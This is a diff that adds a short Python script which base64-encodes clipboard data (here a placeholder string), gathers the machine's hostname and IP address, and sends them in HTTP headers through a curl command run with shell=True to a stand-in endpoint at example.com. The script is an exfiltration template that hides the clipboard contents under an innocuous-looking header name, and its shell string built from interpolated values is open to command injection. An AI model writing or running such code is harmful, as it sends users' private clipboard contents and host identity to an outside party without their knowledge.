@@ -1,0 +1,21 @@
+import base64
+import socket
+import subprocess
+
+clipboard_data = "clipboard data here"
+encoded_data = base64.b64encode(clipboard_data.encode('utf-8')).decode('utf-8')
+
+hostname = socket.gethostname()
+ip_address = socket.gethostbyname(hostname)
+
+headers = {
+    'Metatext': encoded_data,
+    'Hostname': hostname,
+    'IP': ip_address
+}
+
+header_str = ' '.join([f'-H "{key}: {value}"' for key, value in headers.items()])
+
+curl_command = f"curl {header_str} https://example.com/your_endpoint"
+
+subprocess.run(curl_command, shell=True, check=True)
